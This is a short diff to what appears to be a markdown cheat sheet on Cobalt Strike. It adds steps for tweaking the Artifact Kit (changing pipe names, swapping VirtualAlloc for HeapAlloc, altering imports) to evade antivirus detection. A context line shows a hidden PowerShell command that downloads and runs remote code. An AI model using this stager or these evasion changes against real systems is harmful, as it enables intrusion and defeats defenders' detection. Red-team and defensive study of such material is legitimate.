@@ -34,7 +34,6 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Persistence Kit](#persistence-kit)
     * [Resource Kit](#resource-kit)
     * [Artifact Kit](#artifact-kit)
-* [TODO](#todo)
 * [References](#references)
 
 
@@ -384,6 +383,15 @@ Beacon Command Elevators
 
 > Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.
 
+Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
+
+- `sudo apt-get install mingw-w64`
+- Edit the Artifact code
+    * Change pipename strings
+    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
+    * Change Import
+- Build the Artifact
+- Cobalt Strike -> Script Manager > Load .cna
 
 ## References
 
